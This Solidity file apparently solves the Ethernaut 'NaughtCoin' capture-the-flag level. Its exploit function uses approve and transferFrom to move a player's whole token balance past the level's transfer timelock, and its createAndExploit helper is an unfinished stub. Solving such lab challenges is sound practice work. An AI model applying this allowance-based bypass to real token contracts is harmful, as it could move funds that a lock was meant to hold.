// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILevel {
    function createInstance(address _player) external payable returns (address);
}

interface INaughtCoin {
    function player() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract InstanceCreator {
    function createAndExploit(address factory) external returns (address) {
        // Create instance
        address instance = ILevel(factory).createInstance(msg.sender);
        
        // Now exploit it
        INaughtCoin coin = INaughtCoin(instance);
        
        // Get player balance
        uint256 balance = coin.balanceOf(msg.sender);
        
        // Player needs to approve first
        // Then we can transferFrom
        
        return instance;
    }
    
    function exploit(address naughtCoin) external {
        INaughtCoin coin = INaughtCoin(naughtCoin);
        uint256 balance = coin.balanceOf(msg.sender);
        coin.transferFrom(msg.sender, address(1), balance);
    }
}